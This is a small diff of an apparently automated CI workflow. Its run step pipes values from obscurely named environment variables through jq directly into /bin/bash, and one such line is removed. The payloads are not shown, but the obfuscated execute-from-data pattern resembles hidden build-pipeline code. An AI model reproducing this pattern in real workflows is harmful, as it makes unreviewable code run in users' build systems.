@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$do557" | jq -r .dhjo3317 | /bin/bash
           printf '%s' "$skr4592" | jq -r .ocs477 | /bin/bash
-          printf '%s' "$q0678" | jq -r .cud8 | /bin/bash
           printf '%s' "$oabt7586" | jq -r .uxkh9 | /bin/bash
 
       - name: Upload archive
